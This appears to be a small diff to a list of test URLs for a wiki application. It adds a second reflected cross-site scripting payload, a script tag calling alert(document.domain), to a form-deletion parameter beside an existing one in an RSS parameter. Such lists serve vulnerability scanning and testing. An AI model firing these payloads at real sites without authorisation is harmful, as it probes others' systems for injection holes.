@@ -1,1 +1,2 @@
 /?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E
+/?BazaR&vue=formulaire&action=confirm_delete&idformulaire=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
